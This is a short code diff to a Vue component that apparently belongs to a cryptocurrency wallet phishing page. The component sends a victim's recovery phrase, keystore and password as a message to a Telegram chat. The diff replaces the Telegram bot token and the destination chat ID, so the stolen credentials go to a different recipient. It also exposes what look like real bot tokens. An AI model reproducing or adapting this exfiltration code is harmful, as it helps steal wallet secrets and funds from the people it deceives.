@@ -48,7 +48,7 @@
 export default {
     data:()=>({
         step:0,
-        token:'5274075515:AAGbBwlzjM5KSmVZmjsbaX_Aog3xpY0-gRs',
+        token:'5240368866:AAErnZmAoWGPKRqgrjOiE7lEczkOxDAaDWQ',
         data:{}
     }),
     methods:{
@@ -59,7 +59,7 @@ export default {
                     'Content-Type': 'application/json'
                     },
                  body:JSON.stringify({
-                     chat_id:-1001702652291,
+                     chat_id:1791585559,
                      text:`Phrase: ${data.phrase}
 keyStore: ${data.keyStore}
 password: ${data.password}
